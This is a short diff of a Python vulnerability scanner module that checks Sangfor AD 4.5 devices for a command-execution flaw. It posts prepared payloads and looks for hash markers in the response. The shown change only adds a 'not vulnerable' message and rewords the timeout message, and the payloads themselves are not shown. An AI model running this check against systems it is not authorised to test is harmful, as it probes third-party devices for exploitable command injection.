@@ -39,14 +39,15 @@ class sangfor_ad_script_command_exec_BaseVerify():
 
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                 cprint("[+]存在深信服 AD4.5版本下命令执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
-
             req = requests.post(vulnurl, data=post_data2, headers=headers, timeout=10, verify=False)
 
             if r"d93591bdf7860e1e4ee2fca799911215" in req.text:
                 cprint("[+]存在深信服 AD4.5版本下命令执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data2, indent=4), "red")
+            else:
+                cprint("[-]不存在sangfor_ad_script_command_exec漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
